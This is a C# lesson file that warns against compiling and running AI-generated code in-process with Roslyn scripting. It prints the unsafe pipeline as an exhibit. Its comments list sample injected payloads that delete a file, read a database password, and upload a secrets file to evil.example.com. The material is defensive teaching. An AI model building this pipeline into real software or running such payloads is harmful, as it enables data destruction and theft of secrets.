---
title: "Never Do This: Runtime AI Code Evaluation"
chapter: 0
index: 9
dependencies: []
---

```csharp
using System;

// This step displays the "never do this" code pattern as an exhibit rather than
// running it. Microsoft.CodeAnalysis.CSharp.Scripting targets netstandard2.0 and
// does not restore cleanly against net48 in this solution. More importantly, a
// lesson about code you should never execute probably should not execute.
// The full annotated sample is in Lesson.md for reading.

internal static class Program
{
    private static void Main()
    {
        Console.WriteLine("=== Never Do This: Runtime AI Code Evaluation ===");
        Console.WriteLine();
        Console.WriteLine("The following is the pattern this step warns against.");
        Console.WriteLine("It is shown here as an exhibit. It does not run in this step.");
        Console.WriteLine("Read Lesson.md for the full annotated version.");
        Console.WriteLine();

        var exhibit = """
            // Step 1: build a prompt - possibly incorporating user input, a URL
            // parameter, a document field, or any other attacker-controllable source.
            var prompt = "Write a C# expression that returns 'Hello!'";

            // Step 2: call an external AI API and take whatever text comes back.
            var generatedCode = await CallOpenAiAsync(prompt);

            // Step 3: feed that text directly into the Roslyn compiler and run it
            // in-process with this application's full OS permissions.
            //
            // NEVER DO THIS.
            var result = await CSharpScript.EvaluateAsync<string>(
                generatedCode,                              // <- network text, straight to compiler
                ScriptOptions.Default.WithImports("System"));

            // If 'generatedCode' contained any of these instead of a benign expression,
            // they would have executed without any warning:
            //
            //   System.IO.File.Delete(@"C:\critical-data.txt")
            //   System.Environment.GetEnvironmentVariable("DB_PASSWORD")
            //   new System.Net.WebClient().UploadString("http://evil.example.com",
            //       System.IO.File.ReadAllText(@"C:\secrets.json"))
            //
            // The AI API does not protect you.
            // The Roslyn scripting engine does not protect you.
            // Nothing in this pipeline protects you.
            """;

        Console.WriteLine(exhibit);
        Console.WriteLine();
        Console.WriteLine("Text from an HTTP response -> compiled -> executed in-process.");
        Console.WriteLine("No validation. No sandboxing. No timeout. No audit trail.");
        Console.WriteLine("Every CI scan your organization runs: bypassed entirely.");
        Console.WriteLine();
        Console.WriteLine("If you ever think this is acceptable in a production system,");
        Console.WriteLine("delete your IDE and never write another line of code.");
    }
}
```
